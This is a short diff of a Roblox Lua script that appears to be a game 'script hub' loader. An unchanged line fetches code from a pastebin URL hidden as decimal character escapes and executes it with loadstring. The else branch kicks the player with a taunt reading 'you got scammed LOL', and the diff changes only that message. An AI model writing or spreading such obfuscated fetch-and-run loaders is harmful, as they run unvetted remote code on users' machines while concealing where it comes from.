@@ -9,5 +9,5 @@ if _G.IIIIlllIIIIIIllll==true then
     ---脚本中心1.5
 loadstring(game:HttpGet("\104\116\116\112\115\58\47\47\112\97\115\116\101\98\105\110\46\99\111\109\47\114\97\119\47\103\101\109\120\72\119\65\49"))()
     else
-game.Players.LocalPlayer:Kick(a.."你被骗了LOL")
+game.Players.LocalPlayer:Kick("你被骗了LOL")
 end
